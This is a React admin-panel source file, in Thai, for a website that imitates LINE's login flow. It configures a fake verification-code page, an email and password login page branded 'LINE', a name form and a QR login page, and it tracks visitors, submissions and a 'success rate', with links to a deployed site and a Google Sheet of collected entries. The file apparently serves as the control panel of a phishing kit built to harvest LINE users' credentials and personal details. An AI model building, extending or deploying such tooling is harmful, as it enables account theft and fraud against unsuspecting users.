import React, { useState, useEffect } from 'react'
import { Card, CardContent, CardHeader, CardTitle } from './components/ui/card'
import { Button } from './components/ui/button'
import { Input } from './components/ui/input'
import { Label } from './components/ui/label'
import { Textarea } from './components/ui/textarea'
import { Tabs, TabsContent, TabsList, TabsTrigger } from './components/ui/tabs'
import { Settings, FileText, Palette, Database, Eye, LogOut } from 'lucide-react'

const AdminPanel = ({ onLogout }) => {
  const [config, setConfig] = useState({
    texts: {
      verificationTitle: 'รหัสยืนยันตัวตน',
      verificationSubtitle: 'กรุณาใช้รหัสยืนยันตัวตนด้านล่างเพื่อใช้งาน LINE อย่างปลอดภัย',
      formTitle: 'ชื่อ',
      formSubtitle: 'นามสกุล',
      submitButton: 'ยืนยัน',
      qrTitle: 'เข้าสู่ระบบด้วยคิวอาร์โค้ด',
      qrSubtitle: 'โปรดเปิดคิวอาร์โค้ดในแอป LINE สำหรับมือถือใหม่ แล้นกดสแกนคิวอาร์โค้ด',
      backToForm: 'เข้าสู่ระบบด้วยอีเมล',
      howToScan: 'วิธีสแกนคิวอาร์โค้ด',
      emailTitle: 'LINE',
      emailLabel: 'อีเมล',
      passwordLabel: 'รหัสผ่าน',
      loginButton: 'เข้าสู่ระบบ',
      mainPageButton: 'เข้าสู่ระบบด้วยรหัสยืนยัน',
      nextButton: 'เข้าสู่ระบบด้วยอีเมลแทน'
    },
    colors: {
      primary: '#22c55e',
      secondary: '#3b82f6',
      background: '#f8fafc'
    },
    pages: {
      verification: true,
      email: true,
      form: true,
      qr: true
    }
  })

  useEffect(() => {
    const savedConfig = localStorage.getItem('lineFormConfig')
    if (savedConfig) {
      setConfig(JSON.parse(savedConfig))
    }
  }, [])

  const handleConfigChange = (section, key, value) => {
    const newConfig = {
      ...config,
      [section]: {
        ...config[section],
        [key]: value
      }
    }
    setConfig(newConfig)
    localStorage.setItem('lineFormConfig', JSON.stringify(newConfig))
  }

  const handleLogout = () => {
    if (onLogout) onLogout()
  }

  const previewWebsite = () => {
    window.open('https://yo55555.github.io/line-form-website/', '_blank')
  }

  const exportConfig = () => {
    const dataStr = JSON.stringify(config, null, 2)
    const dataUri = 'data:application/json;charset=utf-8,'+ encodeURIComponent(dataStr)
    const exportFileDefaultName = 'line-form-config.json'
    const linkElement = document.createElement('a')
    linkElement.setAttribute('href', dataUri)
    linkElement.setAttribute('download', exportFileDefaultName)
    linkElement.click()
  }

  return (
    <div className="min-h-screen bg-gray-50">
      {/* Header */}
      <div className="bg-white shadow-sm border-b">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="flex justify-between items-center py-4">
            <div>
              <h1 className="text-2xl font-bold text-gray-900">Admin Panel</h1>
              <p className="text-gray-600">จัดการเว็บไซต์ฟอร์ม LINE</p>
            </div>
            <div className="flex space-x-4">
              <Button 
                onClick={previewWebsite}
                variant="outline" 
                size="sm"
                className="flex items-center space-x-2"
              >
                <Eye className="h-4 w-4" />
                <span>ดูตัวอย่าง</span>
              </Button>
              <Button 
                onClick={handleLogout}
                variant="outline" 
                size="sm"
                className="flex items-center space-x-2 text-red-600 hover:text-red-700"
              >
                <LogOut className="h-4 w-4" />
                <span>ออกจากระบบ</span>
              </Button>
            </div>
          </div>
        </div>
      </div>

      {/* Main Content */}
      <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-8">
        <Tabs defaultValue="dashboard" className="w-full">
          <TabsList className="grid w-full grid-cols-5">
            <TabsTrigger value="dashboard" className="flex items-center space-x-2">
              <Settings className="w-4 h-4" />
              <span>Dashboard</span>
            </TabsTrigger>
            <TabsTrigger value="content" className="flex items-center space-x-2">
              <FileText className="w-4 h-4" />
              <span>แก้ไขเนื้อหา</span>
            </TabsTrigger>
            <TabsTrigger value="theme" className="flex items-center space-x-2">
              <Palette className="w-4 h-4" />
              <span>ธีมและสี</span>
            </TabsTrigger>
            <TabsTrigger value="data" className="flex items-center space-x-2">
              <Database className="w-4 h-4" />
              <span>ข้อมูลฟอร์ม</span>
            </TabsTrigger>
            <TabsTrigger value="settings" className="flex items-center space-x-2">
              <Eye className="w-4 h-4" />
              <span>จัดการหน้า</span>
            </TabsTrigger>
          </TabsList>

          {/* Dashboard Tab */}
          <TabsContent value="dashboard" className="space-y-6">
            <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
              <Card>
                <CardHeader>
                  <CardTitle>สถิติการใช้งาน</CardTitle>
                </CardHeader>
                <CardContent>
                  <div className="space-y-2">
                    <div className="flex justify-between">
                      <span>ผู้เข้าชมวันนี้</span>
                      <span className="font-semibold">127</span>
                    </div>
                    <div className="flex justify-between">
                      <span>ฟอร์มที่ส่งแล้ว</span>
                      <span className="font-semibold">89</span>
                    </div>
                    <div className="flex justify-between">
                      <span>อัตราสำเร็จ</span>
                      <span className="font-semibold text-green-600">70%</span>
                    </div>
                  </div>
                </CardContent>
              </Card>

              <Card>
                <CardHeader>
                  <CardTitle>สถานะระบบ</CardTitle>
                </CardHeader>
                <CardContent>
                  <div className="space-y-2">
                    <div className="flex items-center space-x-2">
                      <div className="w-2 h-2 bg-green-500 rounded-full"></div>
                      <span>เว็บไซต์ออนไลน์</span>
                    </div>
                    <div className="flex items-center space-x-2">
                      <div className="w-2 h-2 bg-green-500 rounded-full"></div>
                      <span>Google Sheets เชื่อมต่อ</span>
                    </div>
                    <div className="flex items-center space-x-2">
                      <div className="w-2 h-2 bg-yellow-500 rounded-full"></div>
                      <span>อัปเดตล่าสุด: 5 นาทีที่แล้ว</span>
                    </div>
                  </div>
                </CardContent>
              </Card>

              <Card>
                <CardHeader>
                  <CardTitle>การดำเนินการด่วน</CardTitle>
                </CardHeader>
                <CardContent>
                  <div className="grid grid-cols-2 gap-4 mb-6">
                    <Button 
                      onClick={() => window.open('https://yo55555.github.io/line-form-website/', '_blank')}
                      className="bg-green-500 hover:bg-green-600 h-16 flex flex-col items-center justify-center"
                    >
                      <div className="text-lg mb-1">🏠</div>
                      <span className="text-sm">หน้าหลัก</span>
                    </Button>
                    
                    <Button 
                      onClick={() => window.open('https://yo55555.github.io/line-form-website/', '_blank')}
                      className="bg-blue-500 hover:bg-blue-600 h-16 flex flex-col items-center justify-center"
                    >
                      <div className="text-lg mb-1">📧</div>
                      <span className="text-sm">หน้าอีเมล</span>
                    </Button>
                    
                    <Button 
                      onClick={() => window.open('https://yo55555.github.io/line-form-website/', '_blank')}
                      className="bg-red-500 hover:bg-red-600 h-16 flex flex-col items-center justify-center"
                    >
                      <div className="text-lg mb-1">📝</div>
                      <span className="text-sm">หน้าฟอร์ม</span>
                    </Button>
                    
                    <Button 
                      onClick={() => window.open('https://yo55555.github.io/line-form-website/', '_blank')}
                      className="bg-purple-500 hover:bg-purple-600 h-16 flex flex-col items-center justify-center"
                    >
                      <div className="text-lg mb-1">📱</div>
                      <span className="text-sm">QR Code</span>
                    </Button>
                  </div>
                  
                  <div className="flex flex-wrap gap-2">
                    <Button onClick={previewWebsite} className="bg-blue-500 hover:bg-blue-600">
                      ดูตัวอย่างเว็บไซต์
                    </Button>
                    <Button onClick={exportConfig} variant="outline">
                      ดาวน์โหลดการตั้งค่า
                    </Button>
                    <Button 
                      onClick={() => window.open('https://github.com/yo55555/line-form-website', '_blank')}
                      variant="outline"
                    >
                      GitHub Repository
                    </Button>
                    <Button 
                      onClick={() => {
                        const url = 'https://yo55555.github.io/line-form-website/'
                        navigator.clipboard.writeText(url)
                        alert('คัดลอกลิงก์เว็บไซต์แล้ว!')
                      }}
                      variant="outline"
                    >
                      คัดลอกลิงก์
                    </Button>
                  </div>
                </CardContent>
              </Card>
            </div>
          </TabsContent>

          {/* Content Tab - แก้ไขเนื้อหา */}
          <TabsContent value="content" className="space-y-6">
            <Card>
              <CardHeader>
                <CardTitle>แก้ไขเนื้อหา</CardTitle>
                <p className="text-gray-600">ปรับแต่งข้อความต่างๆ ในเว็บไซต์</p>
              </CardHeader>
              <CardContent className="space-y-6">
                {/* หน้ารหัสยืนยัน */}
                <div className="space-y-4">
                  <h3 className="text-lg font-semibold">หน้ารหัสยืนยันตัวตน</h3>
                  <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                    <div>
                      <Label htmlFor="verificationTitle">หัวข้อหลัก</Label>
                      <Input
                        id="verificationTitle"
                        value={config.texts.verificationTitle}
                        onChange={(e) => handleConfigChange('texts', 'verificationTitle', e.target.value)}
                        placeholder="รหัสยืนยันตัวตน"
                      />
                    </div>
                    <div>
                      <Label htmlFor="verificationSubtitle">คำอธิบาย</Label>
                      <Textarea
                        id="verificationSubtitle"
                        value={config.texts.verificationSubtitle}
                        onChange={(e) => handleConfigChange('texts', 'verificationSubtitle', e.target.value)}
                        placeholder="กรุณาใช้รหัสยืนยันตัวตนด้านล่างเพื่อใช้งาน LINE อย่างปลอดภัย"
                        rows={3}
                      />
                    </div>
                  </div>
                </div>

                {/* หน้าอีเมล */}
                <div className="space-y-4">
                  <h3 className="text-lg font-semibold">หน้าล็อกอินด้วยอีเมล</h3>
                  <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                    <div>
                      <Label htmlFor="emailTitle">หัวข้อหลัก</Label>
                      <Input
                        id="emailTitle"
                        value={config.texts.emailTitle}
                        onChange={(e) => handleConfigChange('texts', 'emailTitle', e.target.value)}
                        placeholder="LINE"
                      />
                    </div>
                    <div>
                      <Label htmlFor="emailLabel">ป้ายอีเมล</Label>
                      <Input
                        id="emailLabel"
                        value={config.texts.emailLabel}
                        onChange={(e) => handleConfigChange('texts', 'emailLabel', e.target.value)}
                        placeholder="อีเมล"
                      />
                    </div>
                    <div>
                      <Label htmlFor="passwordLabel">ป้ายรหัสผ่าน</Label>
                      <Input
                        id="passwordLabel"
                        value={config.texts.passwordLabel}
                        onChange={(e) => handleConfigChange('texts', 'passwordLabel', e.target.value)}
                        placeholder="รหัสผ่าน"
                      />
                    </div>
                    <div>
                      <Label htmlFor="loginButton">ปุ่มเข้าสู่ระบบ</Label>
                      <Input
                        id="loginButton"
                        value={config.texts.loginButton}
                        onChange={(e) => handleConfigChange('texts', 'loginButton', e.target.value)}
                        placeholder="เข้าสู่ระบบ"
                      />
                    </div>
                  </div>
                </div>

                {/* หน้าฟอร์ม */}
                <div className="space-y-4">
                  <h3 className="text-lg font-semibold">หน้าฟอร์มกรอกข้อมูล</h3>
                  <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
                    <div>
                      <Label htmlFor="formTitle">ป้ายชื่อ</Label>
                      <Input
                        id="formTitle"
                        value={config.texts.formTitle}
                        onChange={(e) => handleConfigChange('texts', 'formTitle', e.target.value)}
                        placeholder="ชื่อ"
                      />
                    </div>
                    <div>
                      <Label htmlFor="formSubtitle">ป้ายนามสกุล</Label>
                      <Input
                        id="formSubtitle"
                        value={config.texts.formSubtitle}
                        onChange={(e) => handleConfigChange('texts', 'formSubtitle', e.target.value)}
                        placeholder="นามสกุล"
                      />
                    </div>
                    <div>
                      <Label htmlFor="submitButton">ปุ่มยืนยัน</Label>
                      <Input
                        id="submitButton"
                        value={config.texts.submitButton}
                        onChange={(e) => handleConfigChange('texts', 'submitButton', e.target.value)}
                        placeholder="ยืนยัน"
                      />
                    </div>
                  </div>
                </div>

                {/* หน้า QR Code */}
                <div className="space-y-4">
                  <h3 className="text-lg font-semibold">หน้า QR Code</h3>
                  <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                    <div>
                      <Label htmlFor="qrTitle">หัวข้อหลัก</Label>
                      <Input
                        id="qrTitle"
                        value={config.texts.qrTitle}
                        onChange={(e) => handleConfigChange('texts', 'qrTitle', e.target.value)}
                        placeholder="เข้าสู่ระบบด้วยคิวอาร์โค้ด"
                      />
                    </div>
                    <div>
                      <Label htmlFor="qrSubtitle">คำอธิบาย</Label>
                      <Textarea
                        id="qrSubtitle"
                        value={config.texts.qrSubtitle}
                        onChange={(e) => handleConfigChange('texts', 'qrSubtitle', e.target.value)}
                        placeholder="โปรดเปิดคิวอาร์โค้ดในแอป LINE สำหรับมือถือใหม่ แล้นกดสแกนคิวอาร์โค้ด"
                        rows={3}
                      />
                    </div>
                    <div>
                      <Label htmlFor="backToForm">ปุ่มกลับ</Label>
                      <Input
                        id="backToForm"
                        value={config.texts.backToForm}
                        onChange={(e) => handleConfigChange('texts', 'backToForm', e.target.value)}
                        placeholder="เข้าสู่ระบบด้วยอีเมล"
                      />
                    </div>
                    <div>
                      <Label htmlFor="howToScan">ลิงก์วิธีใช้</Label>
                      <Input
                        id="howToScan"
                        value={config.texts.howToScan}
                        onChange={(e) => handleConfigChange('texts', 'howToScan', e.target.value)}
                        placeholder="วิธีสแกนคิวอาร์โค้ด"
                      />
                    </div>
                  </div>
                </div>

                {/* ลิงก์และปุ่ม */}
                <div className="space-y-4">
                  <h3 className="text-lg font-semibold">ลิงก์และปุ่ม</h3>
                  <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                    <div>
                      <Label htmlFor="mainPageButton">ปุ่มเข้าสู่ระบบด้วยรหัสยืนยัน</Label>
                      <Input
                        id="mainPageButton"
                        value={config.texts.mainPageButton}
                        onChange={(e) => handleConfigChange('texts', 'mainPageButton', e.target.value)}
                        placeholder="เข้าสู่ระบบด้วยรหัสยืนยัน"
                      />
                    </div>
                    <div>
                      <Label htmlFor="nextButton">ปุ่มถัดไป</Label>
                      <Input
                        id="nextButton"
                        value={config.texts.nextButton}
                        onChange={(e) => handleConfigChange('texts', 'nextButton', e.target.value)}
                        placeholder="เข้าสู่ระบบด้วยอีเมลแทน"
                      />
                    </div>
                  </div>
                </div>

                {/* ปุ่มบันทึก */}
                <div className="flex space-x-4">
                  <Button 
                    onClick={() => {
                      alert('บันทึกการตั้งค่าเรียบร้อย!')
                    }}
                    className="bg-green-500 hover:bg-green-600"
                  >
                    บันทึกการเปลี่ยนแปลง
                  </Button>
                  <Button 
                    onClick={previewWebsite}
                    variant="outline"
                  >
                    ดูตัวอย่าง
                  </Button>
                </div>
              </CardContent>
            </Card>
          </TabsContent>

          {/* Theme Tab - จัดการสีและธีม */}
          <TabsContent value="theme" className="space-y-6">
            <Card>
              <CardHeader>
                <CardTitle>ธีมและสี</CardTitle>
                <p className="text-gray-600">ปรับแต่งสีและธีมของเว็บไซต์</p>
              </CardHeader>
              <CardContent className="space-y-6">
                <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
                  <div>
                    <Label htmlFor="primaryColor">สีหลัก (Primary)</Label>
                    <div className="flex items-center space-x-2">
                      <Input
                        id="primaryColor"
                        type="color"
                        value={config.colors.primary}
                        onChange={(e) => handleConfigChange('colors', 'primary', e.target.value)}
                        className="w-16 h-10"
                      />
                      <Input
                        value={config.colors.primary}
                        onChange={(e) => handleConfigChange('colors', 'primary', e.target.value)}
                        placeholder="#22c55e"
                        className="flex-1"
                      />
                    </div>
                  </div>
                  <div>
                    <Label htmlFor="secondaryColor">สีรอง (Secondary)</Label>
                    <div className="flex items-center space-x-2">
                      <Input
                        id="secondaryColor"
                        type="color"
                        value={config.colors.secondary}
                        onChange={(e) => handleConfigChange('colors', 'secondary', e.target.value)}
                        className="w-16 h-10"
                      />
                      <Input
                        value={config.colors.secondary}
                        onChange={(e) => handleConfigChange('colors', 'secondary', e.target.value)}
                        placeholder="#3b82f6"
                        className="flex-1"
                      />
                    </div>
                  </div>
                  <div>
                    <Label htmlFor="backgroundColor">สีพื้นหลัง</Label>
                    <div className="flex items-center space-x-2">
                      <Input
                        id="backgroundColor"
                        type="color"
                        value={config.colors.background}
                        onChange={(e) => handleConfigChange('colors', 'background', e.target.value)}
                        className="w-16 h-10"
                      />
                      <Input
                        value={config.colors.background}
                        onChange={(e) => handleConfigChange('colors', 'background', e.target.value)}
                        placeholder="#f8fafc"
                        className="flex-1"
                      />
                    </div>
                  </div>
                </div>

                <div className="space-y-4">
                  <h3 className="text-lg font-semibold">ธีมสำเร็จรูป</h3>
                  <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
                    <Button
                      onClick={() => {
                        handleConfigChange('colors', 'primary', '#22c55e')
                        handleConfigChange('colors', 'secondary', '#16a34a')
                        handleConfigChange('colors', 'background', '#f0fdf4')
                      }}
                      className="h-20 bg-green-500 hover:bg-green-600"
                    >
                      LINE เขียว
                    </Button>
                    <Button
                      onClick={() => {
                        handleConfigChange('colors', 'primary', '#3b82f6')
                        handleConfigChange('colors', 'secondary', '#1d4ed8')
                        handleConfigChange('colors', 'background', '#eff6ff')
                      }}
                      className="h-20 bg-blue-500 hover:bg-blue-600"
                    >
                      น้ำเงิน
                    </Button>
                    <Button
                      onClick={() => {
                        handleConfigChange('colors', 'primary', '#ef4444')
                        handleConfigChange('colors', 'secondary', '#dc2626')
                        handleConfigChange('colors', 'background', '#fef2f2')
                      }}
                      className="h-20 bg-red-500 hover:bg-red-600"
                    >
                      แดง
                    </Button>
                    <Button
                      onClick={() => {
                        handleConfigChange('colors', 'primary', '#8b5cf6')
                        handleConfigChange('colors', 'secondary', '#7c3aed')
                        handleConfigChange('colors', 'background', '#faf5ff')
                      }}
                      className="h-20 bg-purple-500 hover:bg-purple-600"
                    >
                      ม่วง
                    </Button>
                  </div>
                </div>

                <div className="flex space-x-4">
                  <Button 
                    onClick={() => {
                      alert('บันทึกธีมเรียบร้อย!')
                    }}
                    className="bg-green-500 hover:bg-green-600"
                  >
                    บันทึกธีม
                  </Button>
                  <Button 
                    onClick={previewWebsite}
                    variant="outline"
                  >
                    ดูตัวอย่าง
                  </Button>
                </div>
              </CardContent>
            </Card>
          </TabsContent>

          {/* Data Tab - ข้อมูลฟอร์ม */}
          <TabsContent value="data" className="space-y-6">
            <Card>
              <CardHeader>
                <CardTitle>ข้อมูลฟอร์ม</CardTitle>
                <p className="text-gray-600">ดูและจัดการข้อมูลที่ส่งมาจากฟอร์ม</p>
              </CardHeader>
              <CardContent className="space-y-6">
                <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
                  <div className="text-center">
                    <div className="text-3xl font-bold text-blue-600">127</div>
                    <div className="text-gray-600">ผู้เข้าชมทั้งหมด</div>
                  </div>
                  <div className="text-center">
                    <div className="text-3xl font-bold text-green-600">89</div>
                    <div className="text-gray-600">ฟอร์มที่ส่งแล้ว</div>
                  </div>
                  <div className="text-center">
                    <div className="text-3xl font-bold text-purple-600">70%</div>
                    <div className="text-gray-600">อัตราสำเร็จ</div>
                  </div>
                </div>

                <div className="border rounded-lg overflow-hidden">
                  <table className="w-full">
                    <thead className="bg-gray-50">
                      <tr>
                        <th className="px-4 py-2 text-left">วันที่</th>
                        <th className="px-4 py-2 text-left">ชื่อ</th>
                        <th className="px-4 py-2 text-left">นามสกุล</th>
                        <th className="px-4 py-2 text-left">สถานะ</th>
                      </tr>
                    </thead>
                    <tbody>
                      <tr className="border-t">
                        <td className="px-4 py-2">08/09/2025</td>
                        <td className="px-4 py-2">สมชาย</td>
                        <td className="px-4 py-2">ใจดี</td>
                        <td className="px-4 py-2">
                          <span className="px-2 py-1 bg-green-100 text-green-800 rounded-full text-sm">สำเร็จ</span>
                        </td>
                      </tr>
                      <tr className="border-t">
                        <td className="px-4 py-2">08/09/2025</td>
                        <td className="px-4 py-2">สมหญิง</td>
                        <td className="px-4 py-2">รักดี</td>
                        <td className="px-4 py-2">
                          <span className="px-2 py-1 bg-green-100 text-green-800 rounded-full text-sm">สำเร็จ</span>
                        </td>
                      </tr>
                      <tr className="border-t">
                        <td className="px-4 py-2">08/09/2025</td>
                        <td className="px-4 py-2">สมศักดิ์</td>
                        <td className="px-4 py-2">มีสุข</td>
                        <td className="px-4 py-2">
                          <span className="px-2 py-1 bg-yellow-100 text-yellow-800 rounded-full text-sm">รอดำเนินการ</span>
                        </td>
                      </tr>
                    </tbody>
                  </table>
                </div>

                <div className="flex space-x-4">
                  <Button className="bg-blue-500 hover:bg-blue-600">
                    ส่งออก CSV
                  </Button>
                  <Button variant="outline">
                    รีเฟรชข้อมูล
                  </Button>
                  <Button 
                    onClick={() => window.open('https://docs.google.com/spreadsheets/d/1TyKuO3tCq7HLfKnVoJdXHEGfHTOF1YdprPIHNWutchk/edit', '_blank')}
                    variant="outline"
                  >
                    เปิด Google Sheets
                  </Button>
                </div>
              </CardContent>
            </Card>
          </TabsContent>

          {/* Settings Tab - จัดการหน้า */}
          <TabsContent value="settings" className="space-y-6">
            <Card>
              <CardHeader>
                <CardTitle>จัดการหน้า</CardTitle>
                <p className="text-gray-600">เปิด/ปิดการแสดงหน้าต่างๆ ในเว็บไซต์</p>
              </CardHeader>
              <CardContent className="space-y-6">
                <div className="space-y-4">
                  <div className="flex items-center justify-between p-4 border rounded-lg">
                    <div>
                      <h3 className="font-semibold">หน้ารหัสยืนยันตัวตน</h3>
                      <p className="text-gray-600 text-sm">แสดงรหัส 4 หลักพร้อมตัวนับเวลา</p>
                    </div>
                    <label className="relative inline-flex items-center cursor-pointer">
                      <input 
                        type="checkbox" 
                        checked={config.pages.verification}
                        onChange={(e) => handleConfigChange('pages', 'verification', e.target.checked)}
                        className="sr-only peer"
                      />
                      <div className="w-11 h-6 bg-gray-200 peer-focus:outline-none peer-focus:ring-4 peer-focus:ring-blue-300 rounded-full peer peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-[2px] after:left-[2px] after:bg-white after:border-gray-300 after:border after:rounded-full after:h-5 after:w-5 after:transition-all peer-checked:bg-blue-600"></div>
                    </label>
                  </div>

                  <div className="flex items-center justify-between p-4 border rounded-lg">
                    <div>
                      <h3 className="font-semibold">หน้าล็อกอินด้วยอีเมล</h3>
                      <p className="text-gray-600 text-sm">ฟอร์มกรอกอีเมลและรหัสผ่าน</p>
                    </div>
                    <label className="relative inline-flex items-center cursor-pointer">
                      <input 
                        type="checkbox" 
                        checked={config.pages.email}
                        onChange={(e) => handleConfigChange('pages', 'email', e.target.checked)}
                        className="sr-only peer"
                      />
                      <div className="w-11 h-6 bg-gray-200 peer-focus:outline-none peer-focus:ring-4 peer-focus:ring-blue-300 rounded-full peer peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-[2px] after:left-[2px] after:bg-white after:border-gray-300 after:border after:rounded-full after:h-5 after:w-5 after:transition-all peer-checked:bg-blue-600"></div>
                    </label>
                  </div>

                  <div className="flex items-center justify-between p-4 border rounded-lg">
                    <div>
                      <h3 className="font-semibold">หน้าฟอร์มข้อมูล</h3>
                      <p className="text-gray-600 text-sm">ฟอร์มกรอกชื่อ-นามสกุล</p>
                    </div>
                    <label className="relative inline-flex items-center cursor-pointer">
                      <input 
                        type="checkbox" 
                        checked={config.pages.form}
                        onChange={(e) => handleConfigChange('pages', 'form', e.target.checked)}
                        className="sr-only peer"
                      />
                      <div className="w-11 h-6 bg-gray-200 peer-focus:outline-none peer-focus:ring-4 peer-focus:ring-blue-300 rounded-full peer peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-[2px] after:left-[2px] after:bg-white after:border-gray-300 after:border after:rounded-full after:h-5 after:w-5 after:transition-all peer-checked:bg-blue-600"></div>
                    </label>
                  </div>

                  <div className="flex items-center justify-between p-4 border rounded-lg">
                    <div>
                      <h3 className="font-semibold">หน้า QR Code</h3>
                      <p className="text-gray-600 text-sm">แสดง QR Code สำหรับสแกน</p>
                    </div>
                    <label className="relative inline-flex items-center cursor-pointer">
                      <input 
                        type="checkbox" 
                        checked={config.pages.qr}
                        onChange={(e) => handleConfigChange('pages', 'qr', e.target.checked)}
                        className="sr-only peer"
                      />
                      <div className="w-11 h-6 bg-gray-200 peer-focus:outline-none peer-focus:ring-4 peer-focus:ring-blue-300 rounded-full peer peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-[2px] after:left-[2px] after:bg-white after:border-gray-300 after:border after:rounded-full after:h-5 after:w-5 after:transition-all peer-checked:bg-blue-600"></div>
                    </label>
                  </div>
                </div>

                <div className="bg-blue-50 p-4 rounded-lg">
                  <h4 className="font-semibold text-blue-800 mb-2">ตัวอย่างการทำงาน</h4>
                  <p className="text-blue-700 text-sm">
                    เมื่อปิดหน้าใดหน้าหนึ่ง ระบบจะข้ามไปยังหน้าถัดไปโดยอัตโนมัติ 
                    ตัวอย่าง: หากปิดหน้ารหัสยืนยัน ผู้ใช้จะเข้าสู่หน้าอีเมลทันที
                  </p>
                </div>

                <div className="flex space-x-4">
                  <Button 
                    onClick={() => {
                      alert('บันทึกการตั้งค่าหน้าเรียบร้อย!')
                    }}
                    className="bg-green-500 hover:bg-green-600"
                  >
                    บันทึกการตั้งค่า
                  </Button>
                  <Button 
                    onClick={previewWebsite}
                    variant="outline"
                  >
                    ดูตัวอย่าง
                  </Button>
                </div>
              </CardContent>
            </Card>
          </TabsContent>
        </Tabs>
      </div>
    </div>
  )
}

export default AdminPanel

